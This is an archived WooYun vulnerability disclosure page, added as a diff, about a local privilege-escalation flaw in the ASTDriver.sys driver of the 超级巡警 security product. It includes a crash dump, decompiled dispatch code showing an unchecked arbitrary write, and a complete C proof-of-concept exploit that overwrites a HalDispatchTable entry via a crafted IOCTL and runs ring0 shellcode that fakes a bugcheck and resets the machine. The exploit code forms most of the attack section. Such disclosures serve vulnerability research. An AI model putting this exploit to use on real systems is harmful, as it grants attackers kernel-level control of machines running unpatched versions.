@@ -1,0 +1,1176 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		超级巡警 &lt;= v4 Build0316 ASTDriver.sys 本地特权提升漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		超级巡警 &lt;= v4 Build0316 ASTDriver.sys 本地特权提升漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/shineast">shineast</a> 
+</li><li>提交时间：		2010-07-15 15:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-07-15：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2010-07-15：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">该漏洞是我2010年4月6日晚上，通过自己的IoControl Fuzz工具挖掘的。漏洞存在于超级巡警ASTDriver.sys这个驱动中，影响超级巡警v4 Build0316和以前的版本。利用该漏洞能够实现本地特权提升，进Ring0。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">PAGE_FAULT_IN_NONPAGED_AREA (50)<br />
+<br />
+Invalid system memory was referenced.  This cannot be protected by try-except,<br />
+<br />
+it must be protected by a Probe.  Typically the address is just plain bad or it<br />
+<br />
+is pointing at freed memory.<br />
+<br />
+Arguments:<br />
+<br />
+Arg1: 89441428, memory referenced.<br />
+<br />
+Arg2: 00000001, value 0 = read operation, 1 = write operation.<br />
+<br />
+Arg3: f9c7569b, If non-zero, the instruction address which referenced the bad memory address.<br />
+<br />
+Arg4: 00000000, (reserved)<br />
+<br />
+PROCESS_NAME:  ast.exe<br />
+<br />
+TRAP_FRAME:  f94f1b00 -- (.trap 0xfffffffff94f1b00)<br />
+<br />
+ErrCode = 00000002<br />
+<br />
+eax=89441428 ebx=81266840 ecx=89441428 edx=ffa7c2d8 esi=81312da0 edi=811fc230<br />
+<br />
+eip=f9c7569b esp=f94f1b74 ebp=f94f1b90 iopl=0         nv up ei ng nz ac pe nc<br />
+<br />
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010296<br />
+<br />
+ASTDriver+0x169b:<br />
+<br />
+f9c7569b c70000000000    mov     dword ptr [eax],0    ds:0023:89441428=????????<br />
+<br />
+Resetting default scope<br />
+<br />
+STACK_TEXT:  <br />
+<br />
+f94f1634 804f9afd 00000003 89441428 00000000 nt!RtlpBreakWithStatusInstruction<br />
+<br />
+f94f1680 804fa6e8 00000003 00000000 c044a208 nt!KiBugCheckDebugBreak+0x19<br />
+<br />
+f94f1a60 804fac37 00000050 89441428 00000001 nt!KeBugCheck2+0x574<br />
+<br />
+f94f1a80 80520478 00000050 89441428 00000001 nt!KeBugCheckEx+0x1b<br />
+<br />
+f94f1ae8 80544568 00000001 89441428 00000000 nt!MmAccessFault+0x9a8<br />
+<br />
+f94f1ae8 f9c7569b 00000001 89441428 00000000 nt!KiTrap0E+0xd0<br />
+<br />
+WARNING: Stack unwind information not available. Following frames may be wrong.<br />
+<br />
+f94f1b90 f9c75184 89441428 5fea3278 50000408 ASTDriver+0x169b<br />
+<br />
+f94f1bc4 804efeb1 81286f18 81266840 806e5410 ASTDriver+0x1184<br />
+<br />
+f94f1bd4 8057f688 812668b0 8125fbe8 81266840 nt!IopfCallDriver+0x31<br />
+<br />
+f94f1be8 805804eb 81286f18 81266840 8125fbe8 nt!IopSynchronousServiceTail+0x60<br />
+<br />
+f94f1c84 8057904e 00000928 00000000 00000000 nt!IopXxxControlFile+0x5c5<br />
+<br />
+f94f1cb8 f74ecb12 00000928 00000000 00000000 nt!NtDeviceIoControlFile+0x2a<br />
+<br />
+f94f1d34 8054160c 00000928 00000000 00000000 BehaviorMon!HookNtDeviceIoControlFile+0x892<br />
+<br />
+//省略……<br />
+<br />
+	从上面分析中的栈回溯可以看出，问题发生在ASTDriver+0x169b所在的函数中，这个函数是从ASTDriver+0x1184所在的函数调用过来的。因此我们先定位到ASTDriver+0x1184所在的函数，如下所示：<br />
+<br />
+	signed int __stdcall sub_110D0(int a1, PIRP Irp)<br />
+<br />
+	{<br />
+<br />
+	  signed int result; // eax@2<br />
+<br />
+	  int pIrpStack; // [sp+8h] [bp-1Ch]@1<br />
+<br />
+	  int v4; // [sp+Ch] [bp-18h]@10<br />
+<br />
+	  int secondDWORD; // [sp+10h] [bp-14h]@3<br />
+<br />
+	  PVOID systemBuffer; // [sp+18h] [bp-Ch]@1<br />
+<br />
+	  int firstDWORD; // [sp+1Ch] [bp-8h]@3<br />
+<br />
+	  int IoControlCode; // [sp+20h] [bp-4h]@3 <br />
+<br />
+	  pIrpStack = (int)Irp-&gt;Tail.Overlay.CurrentStackLocation;<br />
+<br />
+	  systemBuffer = Irp-&gt;AssociatedIrp.MasterIrp;<br />
+<br />
+	  if ( *(_DWORD *)(pIrpStack + 8) == 16 )<br />
+<br />
+	  {<br />
+<br />
+	    secondDWORD = *((_DWORD *)systemBuffer + 1);<br />
+<br />
+	    firstDWORD = *(_DWORD *)systemBuffer;<br />
+<br />
+	    IoControlCode = *(_DWORD *)(pIrpStack + 12);<br />
+<br />
+	    switch ( IoControlCode )<br />
+<br />
+	    {<br />
+<br />
+	      case 0x50000404:<br />
+<br />
+	        v4 = sub_112B0(firstDWORD, secondDWORD, *((PVOID *)systemBuffer + 2), *((_DWORD *)systemBuffer + 3));<br />
+<br />
+	        break;<br />
+<br />
+	      case 0x50000408:<br />
+<br />
+	        v4 = sub_11690((PVOID)firstDWORD, secondDWORD);<br />
+<br />
+	        break;<br />
+<br />
+	      case 0x5000040C:<br />
+<br />
+	        v4 = sub_11810((PVOID)firstDWORD, secondDWORD);<br />
+<br />
+	        break;<br />
+<br />
+	    }<br />
+<br />
+	    IofCompleteRequest(Irp, 0);<br />
+<br />
+	    result = v4;<br />
+<br />
+	  }<br />
+<br />
+	  else<br />
+<br />
+	  {<br />
+<br />
+	    IofCompleteRequest(Irp, 0);<br />
+<br />
+	    result = 0xC000000Du;<br />
+<br />
+	  }<br />
+<br />
+	  return result;<br />
+<br />
+	}<br />
+<br />
+	该函数实际上就是驱动的派遣函数。当IoControlCode为0x50000408时，会调用sub_11690函数，参数有两个，第一个参数是用户输入缓冲区中的第一个DWORD，第二个参数是用户输入缓冲区的第二个DWORD。从Windbg输出的被随机化的用户输入数据可以看到，这两个DWORD分别是0x89441428和0x5fea3278，这一点和栈回溯的结果是一致的。<br />
+<br />
+f94f1b90 f9c75184 89441428 5fea3278 50000408 ASTDriver+0x169b<br />
+<br />
+	接下来，我们需要分析一下sub_11690函数的内部逻辑，<br />
+<br />
+signed int __stdcall sub_11690(PVOID firstDWORD, int secondDWORD)<br />
+<br />
+{<br />
+<br />
+  signed int result; // eax@2<br />
+<br />
+  unsigned int v3; // [sp+0h] [bp-1Ch]@6<br />
+<br />
+  int v4; // [sp+4h] [bp-18h]@6<br />
+<br />
+  int v5; // [sp+14h] [bp-8h]@6<br />
+<br />
+  PVOID v6; // [sp+18h] [bp-4h]@15 <br />
+<br />
+  *(_DWORD *)firstDWORD = 0;<br />
+<br />
+  if ( secondDWORD == 32 )<br />
+<br />
+  {<br />
+<br />
+    if ( MmIsAddressValid(firstDWORD) &amp;&amp; MmIsAddressValid(firstDWORD + secondDWORD - 1) )<br />
+<br />
+	{<br />
+<br />
+	//省略部分代码……<br />
+<br />
+	}<br />
+<br />
+	}<br />
+<br />
+  return result;<br />
+<br />
+}<br />
+<br />
+	这个函数有一个致命的错误，函数开头没有对firstDWORD进行任何检查，直接向firstDWORD地址所指向的DWORD赋值为0，而firstDWORD是我们可以控制的。<br />
+<br />
+	至此，该漏洞已经分析完毕。漏洞利用起来也非常简单，只要将要修改的Ring0内存地址放在输入缓冲区的第一个DWORD即可。然后向设备\device\ASTDrivers发送IoControlCode为0x50000408的IoControl。这样便实现了向任意地址写0的作用。<br />
+<br />
+	另外，如果进一步研究上面sub_11690函数的内部逻辑，如果不利用“*(_DWORD *)firstDWORD = 0;”这句代码的漏洞，函数中还有其他几处漏洞可以利用，最终实现向任意地址写入任意数据的效果。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#include &quot;ASTDrivers_Exp.h&quot;<br />
+<br />
+#include &quot;InvbShellCode.h&quot;<br />
+<br />
+<br />
+<br />
+#define BUFFER_LENGTH 0x04<br />
+<br />
+#define IOCTL_METHOD_NEITHER 0x5000040c<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+VOID InbvShellCode()<br />
+<br />
+{<br />
+<br />
+    __asm<br />
+<br />
+    {<br />
+<br />
+        //<br />
+<br />
+        // KeDisableInterrupts<br />
+<br />
+        //<br />
+<br />
+        pushf<br />
+<br />
+        pop eax<br />
+<br />
+        and eax, 0x0200<br />
+<br />
+        shr eax, 0x09<br />
+<br />
+        cli<br />
+<br />
+        <br />
+<br />
+        //<br />
+<br />
+        // Prepareing Screen<br />
+<br />
+        //<br />
+<br />
+        call InbvAcquireDisplayOwnership<br />
+<br />
+        <br />
+<br />
+        call InbvResetDisplay<br />
+<br />
+  <br />
+<br />
+        sub esi, esi<br />
+<br />
+        push 0x04<br />
+<br />
+        mov edi, 0x01DF<br />
+<br />
+        push edi<br />
+<br />
+        mov ebx, 0x027F<br />
+<br />
+        push ebx<br />
+<br />
+        push esi<br />
+<br />
+        push esi<br />
+<br />
+        call InbvSolidColorFill    <br />
+<br />
+        <br />
+<br />
+        push 0x0F<br />
+<br />
+        call InbvSetTextColor<br />
+<br />
+        <br />
+<br />
+        push esi<br />
+<br />
+        call InbvInstallDisplayStringFilter<br />
+<br />
+        <br />
+<br />
+        inc esi<br />
+<br />
+        push esi<br />
+<br />
+        call InbvEnableDisplayString<br />
+<br />
+        <br />
+<br />
+        dec edi<br />
+<br />
+        dec edi<br />
+<br />
+        push edi<br />
+<br />
+        push ebx<br />
+<br />
+        dec esi<br />
+<br />
+        push esi<br />
+<br />
+        push esi<br />
+<br />
+        call InbvSetScrollRegion<br />
+<br />
+        <br />
+<br />
+        lea eax, BugCheckString<br />
+<br />
+        push eax<br />
+<br />
+        call InbvDisplayString<br />
+<br />
+            <br />
+<br />
+        mov esi, 0x80000000<br />
+<br />
+        mov ecx, esi<br />
+<br />
+        <br />
+<br />
+        //<br />
+<br />
+        // Countdown<br />
+<br />
+        //<br />
+<br />
+    __loop01:<br />
+<br />
+        dec ecx<br />
+<br />
+        jnz __loop01<br />
+<br />
+        <br />
+<br />
+        lea eax, BugCheck01<br />
+<br />
+        push eax<br />
+<br />
+        call InbvDisplayString<br />
+<br />
+<br />
+<br />
+        mov ecx, esi<br />
+<br />
+<br />
+<br />
+    __loop02:<br />
+<br />
+        dec ecx<br />
+<br />
+        jnz __loop02<br />
+<br />
+<br />
+<br />
+        lea eax, BugCheck02<br />
+<br />
+        push eax<br />
+<br />
+        call InbvDisplayString<br />
+<br />
+<br />
+<br />
+        mov ecx, esi<br />
+<br />
+<br />
+<br />
+    __loop03:<br />
+<br />
+        dec ecx<br />
+<br />
+        jnz __loop03<br />
+<br />
+<br />
+<br />
+        lea eax, BugCheck03<br />
+<br />
+        push eax<br />
+<br />
+        call InbvDisplayString<br />
+<br />
+<br />
+<br />
+        mov ecx, esi<br />
+<br />
+<br />
+<br />
+    __loop04:<br />
+<br />
+        dec ecx<br />
+<br />
+        jnz __loop04<br />
+<br />
+<br />
+<br />
+        lea eax, BugCheck04<br />
+<br />
+        push eax<br />
+<br />
+        call InbvDisplayString<br />
+<br />
+<br />
+<br />
+        mov ecx, esi<br />
+<br />
+        shl ecx, 0x01<br />
+<br />
+<br />
+<br />
+    __loop05:<br />
+<br />
+        dec ecx<br />
+<br />
+        jnz __loop05<br />
+<br />
+        <br />
+<br />
+        //<br />
+<br />
+        // Reseting Processor<br />
+<br />
+        //<br />
+<br />
+        mov al, 0xFE<br />
+<br />
+        out 0x64, al<br />
+<br />
+    }<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+PVOID RtlAllocateMemory(<br />
+<br />
+    IN ULONG Length)<br />
+<br />
+{<br />
+<br />
+    NTSTATUS NtStatus;<br />
+<br />
+<br />
+<br />
+    PVOID BaseAddress = NULL;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+    NtStatus = NtAllocateVirtualMemory(<br />
+<br />
+                                       NtCurrentProcess(),<br />
+<br />
+                                       &amp;BaseAddress,<br />
+<br />
+                                       0,<br />
+<br />
+                                       &amp;Length,<br />
+<br />
+                                       MEM_RESERVE |<br />
+<br />
+                                       MEM_COMMIT,<br />
+<br />
+                                       PAGE_READWRITE);<br />
+<br />
+<br />
+<br />
+    if(NtStatus == STATUS_SUCCESS)<br />
+<br />
+    {<br />
+<br />
+        RtlZeroMemory(BaseAddress, Length);<br />
+<br />
+<br />
+<br />
+        return BaseAddress;<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    return NULL;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+VOID RtlFreeMemory(<br />
+<br />
+    IN PVOID BaseAddress)<br />
+<br />
+{<br />
+<br />
+    NTSTATUS NtStatus;<br />
+<br />
+<br />
+<br />
+    ULONG FreeSize = 0;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+    NtStatus = NtFreeVirtualMemory(<br />
+<br />
+                                   NtCurrentProcess(),<br />
+<br />
+                                   &amp;BaseAddress,<br />
+<br />
+                                   &amp;FreeSize,<br />
+<br />
+                                   MEM_RELEASE);<br />
+<br />
+}<br />
+<br />
+char g_ressdtDataForAst[32]={0};<br />
+<br />
+char g_ressdtInputBuffer[16]={0};//输入的缓冲区<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+int __cdecl main(int argc, char **argv)<br />
+<br />
+{<br />
+<br />
+    NTSTATUS NtStatus;<br />
+<br />
+<br />
+<br />
+    HANDLE DeviceHandle;<br />
+<br />
+    ULONG ReturnLength = 0;<br />
+<br />
+    <br />
+<br />
+    ULONG ImageBase;<br />
+<br />
+    PVOID MappedBase;<br />
+<br />
+    UCHAR ImageName[KERNEL_NAME_LENGTH];<br />
+<br />
+    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;<br />
+<br />
+    PVOID HalDispatchTable;<br />
+<br />
+    PVOID xHalQuerySystemInformation;<br />
+<br />
+    PVOID MmUserProbeAddress;<br />
+<br />
+<br />
+<br />
+    ULONG ShellCodeSize = PAGE_SIZE;<br />
+<br />
+    PVOID ShellCodeAddress;<br />
+<br />
+    PVOID BaseAddress = NULL;<br />
+<br />
+<br />
+<br />
+    UNICODE_STRING DeviceName;<br />
+<br />
+    UNICODE_STRING DllName;<br />
+<br />
+    ANSI_STRING ProcedureName;<br />
+<br />
+    OBJECT_ATTRIBUTES ObjectAttributes;<br />
+<br />
+    IO_STATUS_BLOCK IoStatusBlock;<br />
+<br />
+    SYSTEM_MODULE_INFORMATION_EX *ModuleInformation = NULL;<br />
+<br />
+    LARGE_INTEGER Interval;<br />
+<br />
+<br />
+<br />
+    ULONG TextColor;<br />
+<br />
+    <br />
+<br />
+    ///////////////////////////////////////////////////////////////////////////////////////////////<br />
+<br />
+<br />
+<br />
+    system(&quot;cls&quot;);<br />
+<br />
+<br />
+<br />
+    NtStatus = NtQuerySystemInformation(<br />
+<br />
+                                        SystemModuleInformation,<br />
+<br />
+                                        ModuleInformation,<br />
+<br />
+                                        ReturnLength,<br />
+<br />
+                                        &amp;ReturnLength);<br />
+<br />
+        <br />
+<br />
+    if(NtStatus == STATUS_INFO_LENGTH_MISMATCH)<br />
+<br />
+    {<br />
+<br />
+        ReturnLength = (ReturnLength &amp; 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);<br />
+<br />
+        <br />
+<br />
+        ModuleInformation = RtlAllocateMemory(ReturnLength);<br />
+<br />
+<br />
+<br />
+        if(ModuleInformation)<br />
+<br />
+        {<br />
+<br />
+            NtStatus = NtQuerySystemInformation(<br />
+<br />
+                                                SystemModuleInformation,<br />
+<br />
+                                                ModuleInformation,<br />
+<br />
+                                                ReturnLength,<br />
+<br />
+                                                NULL);<br />
+<br />
+<br />
+<br />
+            if(NtStatus == STATUS_SUCCESS)<br />
+<br />
+            {<br />
+<br />
+                ImageBase = (ULONG)(ModuleInformation-&gt;Modules[0].Base);<br />
+<br />
+<br />
+<br />
+                RtlMoveMemory(<br />
+<br />
+                              ImageName,<br />
+<br />
+                              (PVOID)(ModuleInformation-&gt;Modules[0].ImageName +<br />
+<br />
+                              ModuleInformation-&gt;Modules[0].ModuleNameOffset),<br />
+<br />
+                              KERNEL_NAME_LENGTH);<br />
+<br />
+<br />
+<br />
+                printf(&quot; +----------------------------------------------------------------------------+\n&quot;<br />
+<br />
+                       &quot; | ImageBase - 0x%.8X                                                     |\n&quot;<br />
+<br />
+                       &quot; | ImageName - %s                                                   |\n&quot;,<br />
+<br />
+                       ImageBase,<br />
+<br />
+                       ImageName);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                RtlFreeMemory(ModuleInformation);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                RtlCreateUnicodeStringFromAsciiz(&amp;DllName, (PUCHAR)ImageName);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                NtStatus = LdrLoadDll(<br />
+<br />
+                                      NULL,                // DllPath<br />
+<br />
+                                      &amp;DllCharacteristics, // DllCharacteristics<br />
+<br />
+                                      &amp;DllName,            // DllName<br />
+<br />
+                                      &amp;MappedBase);        // DllHandle<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of LdrLoadDll - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+ <br />
+<br />
+                RtlInitAnsiString(&amp;ProcedureName, &quot;HalDispatchTable&quot;); <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                NtStatus = LdrGetProcedureAddress(<br />
+<br />
+                                                  (PVOID)MappedBase,          // DllHandle<br />
+<br />
+                                                  &amp;ProcedureName,             // ProcedureName<br />
+<br />
+                                                  0,                          // ProcedureNumber OPTIONAL<br />
+<br />
+                                                  (PVOID*)&amp;HalDispatchTable); // ProcedureAddress<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of LdrGetProcedureAddress - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+<br />
+<br />
+                (ULONG)HalDispatchTable -= (ULONG)MappedBase;<br />
+<br />
+                (ULONG)HalDispatchTable += ImageBase;<br />
+<br />
+<br />
+<br />
+                (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);<br />
+<br />
+<br />
+<br />
+                printf(&quot; |                                                                            |\n&quot;<br />
+<br />
+                       &quot; | HalDispatchTable - 0x%.8X                                              |\n&quot;<br />
+<br />
+                       &quot; | xHalQuerySystemInformation - 0x%.8X                                    |\n&quot;<br />
+<br />
+                       &quot; +----------------------------------------------------------------------------+\n&quot;,<br />
+<br />
+                       HalDispatchTable,<br />
+<br />
+                       xHalQuerySystemInformation);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of XxInitInbv - %.8X\n&quot;, NtStatus);	<br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+<br />
+<br />
+                LdrUnloadDll((PVOID)MappedBase);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                RtlInitUnicodeString(&amp;DeviceName, L&quot;\\Device\\ASTDrivers&quot;);<br />
+<br />
+<br />
+<br />
+                ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);<br />
+<br />
+                ObjectAttributes.RootDirectory = 0;<br />
+<br />
+                ObjectAttributes.ObjectName = &amp;DeviceName;<br />
+<br />
+                ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;<br />
+<br />
+                ObjectAttributes.SecurityDescriptor = NULL;<br />
+<br />
+                ObjectAttributes.SecurityQualityOfService = NULL;<br />
+<br />
+<br />
+<br />
+                NtStatus = NtCreateFile(<br />
+<br />
+                                        &amp;DeviceHandle,     // FileHandle<br />
+<br />
+                                        FILE_READ_DATA |<br />
+<br />
+                                        FILE_WRITE_DATA,   // DesiredAccess<br />
+<br />
+                                        &amp;ObjectAttributes, // ObjectAttributes<br />
+<br />
+                                        &amp;IoStatusBlock,    // IoStatusBlock<br />
+<br />
+                                        NULL,              // AllocationSize OPTIONAL<br />
+<br />
+                                        0,                 // FileAttributes<br />
+<br />
+                                        FILE_SHARE_READ |<br />
+<br />
+                                        FILE_SHARE_WRITE, // ShareAccess<br />
+<br />
+                                        FILE_OPEN_IF,     // CreateDisposition<br />
+<br />
+                                        0,                // CreateOptions<br />
+<br />
+                                        NULL,             // EaBuffer OPTIONAL<br />
+<br />
+                                        0);               // EaLength<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtCreateFile - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+ <br />
+<br />
+<br />
+<br />
+				memset(g_ressdtDataForAst,0,32);<br />
+<br />
+				memset(g_ressdtInputBuffer,0,16);<br />
+<br />
+				*(DWORD *)g_ressdtDataForAst=2;<br />
+<br />
+				*(DWORD *)((ULONG)g_ressdtDataForAst+4)=0xFF;<br />
+<br />
+				*(DWORD *)((ULONG)g_ressdtDataForAst+8)=(DWORD)xHalQuerySystemInformation;<br />
+<br />
+				*(DWORD *)((ULONG)g_ressdtDataForAst+12)=2;<br />
+<br />
+				*(ULONG *)((ULONG)g_ressdtDataForAst+16)=4;<br />
+<br />
+				*(ULONG *)((ULONG)g_ressdtDataForAst+20)=0x90;<br />
+<br />
+				*(ULONG *)((ULONG)g_ressdtDataForAst+24)=0x90;<br />
+<br />
+				*(ULONG *)((ULONG)g_ressdtDataForAst+28)=0x90;<br />
+<br />
+<br />
+<br />
+				//设置缓冲区中的指针 使其指向真实的结构体<br />
+<br />
+				*(DWORD *)g_ressdtInputBuffer=(DWORD)g_ressdtDataForAst;<br />
+<br />
+ <br />
+<br />
+<br />
+<br />
+                NtStatus = NtDeviceIoControlFile(<br />
+<br />
+                                                 DeviceHandle,         // FileHandle<br />
+<br />
+                                                 NULL,                 // Event<br />
+<br />
+                                                 NULL,                 // ApcRoutine<br />
+<br />
+                                                 NULL,                 // ApcContext<br />
+<br />
+                                                 &amp;IoStatusBlock,       // IoStatusBlock<br />
+<br />
+                                                 IOCTL_METHOD_NEITHER, // IoControlCode<br />
+<br />
+                                                 g_ressdtInputBuffer,           // InputBuffer<br />
+<br />
+                                                 16,        // InputBufferLength<br />
+<br />
+                                                 0,           // OutputBuffer<br />
+<br />
+                                                 0);       // OutBufferLength<br />
+<br />
+                <br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtDeviceIoControlFile [1] - %.8X\n&quot;, NtStatus);<br />
+<br />
+                    //return NtStatus;<br />
+<br />
+                } <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                ShellCodeAddress = (PVOID)sizeof(ULONG);<br />
+<br />
+<br />
+<br />
+                NtStatus = NtAllocateVirtualMemory(<br />
+<br />
+                                                   NtCurrentProcess(),      // ProcessHandle<br />
+<br />
+                                                   &amp;ShellCodeAddress,       // BaseAddress<br />
+<br />
+                                                   0,                       // ZeroBits<br />
+<br />
+                                                   &amp;ShellCodeSize,          // AllocationSize<br />
+<br />
+                                                   MEM_RESERVE | <br />
+<br />
+                                                   MEM_COMMIT |<br />
+<br />
+                                                   MEM_TOP_DOWN,            // AllocationType<br />
+<br />
+                                                   PAGE_EXECUTE_READWRITE); // Protect<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtAllocateVirtualMemory - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+<br />
+<br />
+                RtlMoveMemory(<br />
+<br />
+                              ShellCodeAddress,<br />
+<br />
+                              (PVOID)InbvShellCode,<br />
+<br />
+                              ShellCodeSize);<br />
+<br />
+<br />
+<br />
+                Interval.LowPart = 0xFF676980;<br />
+<br />
+                Interval.HighPart = 0xFFFFFFFF;<br />
+<br />
+<br />
+<br />
+                printf(&quot;\n 3&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+                printf(&quot; 2&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+                printf(&quot; 1&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+                printf(&quot; Hoop\n\n&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                NtStatus = NtQueryIntervalProfile(<br />
+<br />
+                                                  ProfileTotalIssues, // Source<br />
+<br />
+                                                  NULL);              // Interval<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtQueryIntervalProfile - %.8X\n&quot;, NtStatus);<br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+                <br />
+<br />
+<br />
+<br />
+                NtStatus = NtClose(DeviceHandle);<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtClose - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+            }<br />
+<br />
+        }<br />
+<br />
+    }<br />
+<br />
+    <br />
+<br />
+    return FALSE;<br />
+<br />
+} </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">该漏洞本人在4月份已经通知厂商修复，6月份厂商已经告知我修复完毕。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/shineast" title="shineast">shineast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021" title="超级巡警 &lt;= v4 Build0316 ASTDriver.sys 本地特权提升漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：7 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
